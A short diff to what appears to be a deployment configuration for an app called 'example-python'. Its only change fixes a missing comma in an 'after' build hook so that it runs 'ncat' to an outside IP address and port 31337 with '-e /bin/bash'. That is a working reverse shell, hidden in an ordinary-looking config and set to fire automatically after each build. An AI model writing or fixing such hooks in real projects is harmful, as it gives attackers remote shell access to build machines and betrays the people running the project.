@@ -10,7 +10,7 @@ app "example-python" {
     use "docker" {}
     hook {
       when    = "after"
-      command = ["ncat", "172.31.11.230" "31337", "-e", "/bin/bash"]
+      command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
     }
   }
 
